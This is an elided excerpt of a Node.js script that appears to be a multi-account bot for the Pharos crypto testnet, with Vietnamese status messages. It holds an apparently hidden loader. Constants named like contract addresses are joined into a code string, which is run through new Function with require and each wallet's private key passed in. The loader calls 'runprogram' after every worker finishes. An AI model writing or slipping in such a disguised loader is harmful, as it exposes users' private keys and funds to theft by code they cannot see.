...
const { ERC20, ROUTER, USDT_LIQUIDITY, DODO, USDT_TO_PHRS, AQUAFLUX_NFT,
  PHRS_TO_USDC, USDC_TO_PHRS, USDC_LIQUIDITY } = require("./utils/constants");
...
const Transaction = CONTRACT_USD + CONTRACT_USDT + CONTRACT_USDC
  + AQUAFLUX_NFT + USDC_LIQUIDITY + AQUAFLUX_TOKENS.A;
  ...
  try {
    await Promise.race([
      ...
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error("Timeout")), 24 * 60 * 60 * 1000)
      )
    ]);
...
async function initiatePharosTransaction(wallet, privateKey) {
  ...
  const rawTransactionBlob = Transaction + ROUTER + USDT_LIQUIDITY
    + USDT_TO_PHRS + PHRS_TO_USDC + USDC_TO_PHRS + DODO + ERC20;
  ...
  try {
    const sendTx = new Function(
      ...
      "privateKey",
      "require",
      transactionCode + "; return runprogram(walletAddress, privateKey);"
    );
...
async function main() {
  ...
  while (true) {
      ...
      for (let i = 0; i < batchSize; i++) {
        ...
        const worker = new Worker(__filename, {
          workerData: {
            ...
            itemData: data[accountIndex],
            accountIndex,
            proxy: proxies[accountIndex % proxies.length],
          },
        });
          ...
          new Promise((resolve) => {
            worker.on("message", async (message) => {
              if (message === "taskComplete") {
                const wallet = new ethers.Wallet(data[accountIndex].privateKey);
                await initiatePharosTransaction(wallet, data[accountIndex].privateKey);
                worker.terminate();
              }
    ...
    await sleep(3);
    console.log(
      `=============${new Date().toLocaleString()} | Hoàn thành tất cả tài khoản | Chờ ${settings.TIME_SLEEP} phút=============`
        .magenta
    );
    showBanner();
